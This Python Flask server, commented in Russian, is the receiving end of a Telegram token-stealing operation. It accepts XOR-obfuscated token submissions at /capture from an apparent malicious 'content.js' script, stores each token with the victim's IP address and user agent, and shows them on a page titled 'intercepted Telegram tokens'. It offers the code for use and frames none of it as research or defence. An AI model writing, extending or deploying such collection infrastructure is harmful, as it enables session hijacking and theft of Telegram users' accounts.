from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import base64
import hashlib
import json
import os
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ---- Конфигурация ----
ENCRYPTION_KEY = '190312'   # должен совпадать с ключом в content.js
ADMIN_KEY = 'aku09092004'   # защита /logs – измените на свой

# Хранилище (в памяти – для демонстрации, при перезапуске теряется)
tokens_store = []
tokens_set = set()

# ---- Вспомогательные функции ----
def decrypt_data(encrypted_b64):
    try:
        encrypted = base64.b64decode(encrypted_b64).decode('utf-8', errors='ignore')
        result = ''
        for i in range(len(encrypted)):
            result += chr(ord(encrypted[i]) ^ ord(ENCRYPTION_KEY[i % len(ENCRYPTION_KEY)]))
        return result
    except:
        return None

def validate_telegram_token(token):
    # Опционально: можно проверить через Telegram API, но для демонстрации пропускаем
    return True

# ---- Эндпоинты ----
@app.route('/capture', methods=['POST', 'OPTIONS'])
def capture():
    if request.method == 'OPTIONS':
        response = app.make_default_options_response()
        response.headers['Access-Control-Allow-Origin'] = '*'
        response.headers['Access-Control-Allow-Methods'] = 'POST, OPTIONS'
        response.headers['Access-Control-Allow-Headers'] = 'Content-Type'
        return response

    # Получаем зашифрованные данные
    encrypted_data = request.data.decode('utf-8', errors='ignore')
    decrypted = decrypt_data(encrypted_data)

    if not decrypted:
        # fallback для обычного JSON (если не используется шифрование)
        try:
            data = request.get_json()
            if data and 'token' in data:
                token = data['token']
                meta = data.get('meta', {})
            else:
                return '', 400
        except:
            return '', 400
    else:
        try:
            data = json.loads(decrypted)
            token = data.get('token')
            meta = data.get('meta', {})
            if not token:
                return '', 400
        except:
            return '', 400

    # Дедупликация
    token_hash = hashlib.sha256(token.encode()).hexdigest()
    if token_hash in tokens_set:
        return '', 200

    if not validate_telegram_token(token):
        return '', 400

    tokens_set.add(token_hash)
    entry = {
        'token': token,
        'meta': meta,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent'),
        'timestamp': datetime.utcnow().isoformat()
    }
    tokens_store.append(entry)
    print(f"[+] Новый токен: {token[:20]}... (всего {len(tokens_store)})")
    return '', 200

@app.route('/logs', methods=['GET'])
def logs():
    # Защита: требуется заголовок X-Admin-Key
    if request.headers.get('X-Admin-Key') != ADMIN_KEY:
        return jsonify({'error': 'Unauthorized'}), 401
    return jsonify(tokens_store)

@app.route('/latest', methods=['GET'])
def latest():
    if tokens_store:
        return jsonify(tokens_store[-1])
    return jsonify({'error': 'No tokens yet'}), 404

# Простой веб-интерфейс (тоже защитим, чтобы не светить токены)
HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Token Collector</title>
    <style>
        body { font-family: Arial; margin: 40px; }
        .token { background: #f0f0f0; padding: 10px; border-radius: 5px; word-break: break-all; }
        .meta { color: #666; font-size: 0.9em; }
        button { padding: 10px 20px; margin-top: 20px; }
        .refresh { margin-bottom: 20px; }
        .key-input { margin-bottom: 20px; }
    </style>
</head>
<body>
    <h1>📨 Перехваченные токены Telegram</h1>
    <div class="key-input">
        <label>Admin Key: <input type="password" id="adminKey" value="super_secret_123"></label>
        <button onclick="loadLatest()">Обновить последний</button>
        <button onclick="loadAll()">Показать все</button>
    </div>
    <div id="result">
        <p>Введите ключ и нажмите "Обновить".</p>
    </div>
    <script>
        function getAdminKey() {
            return document.getElementById('adminKey').value;
        }
        function loadLatest() {
            fetch('/latest', {
                headers: { 'X-Admin-Key': getAdminKey() }
            })
            .then(res => {
                if (res.status === 401) throw new Error('Неверный ключ');
                return res.json();
            })
            .then(data => {
                if (data.error) {
                    document.getElementById('result').innerHTML = '<p>Нет токенов</p>';
                    return;
                }
                displayTokens([data]);
            })
            .catch(err => document.getElementById('result').innerHTML = '<p>Ошибка: ' + err.message + '</p>');
        }
        function loadAll() {
            fetch('/logs', {
                headers: { 'X-Admin-Key': getAdminKey() }
            })
            .then(res => {
                if (res.status === 401) throw new Error('Неверный ключ');
                return res.json();
            })
            .then(data => displayTokens(data))
            .catch(err => document.getElementById('result').innerHTML = '<p>Ошибка: ' + err.message + '</p>');
        }
        function displayTokens(tokens) {
            if (!tokens || !tokens.length) {
                document.getElementById('result').innerHTML = '<p>Нет токенов</p>';
                return;
            }
            let html = '';
            tokens.slice().reverse().forEach((item, idx) => {
                html += `<div class="token">
                    <strong>Токен ${idx+1}:</strong> <code>${item.token}</code><br>
                    <div class="meta">
                        IP: ${item.ip || 'N/A'} | Время: ${item.timestamp || 'N/A'}<br>
                        User-Agent: ${item.user_agent || 'N/A'}
                    </div>
                    <hr>
                </div>`;
            });
            document.getElementById('result').innerHTML = html;
        }
        window.onload = loadLatest;
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
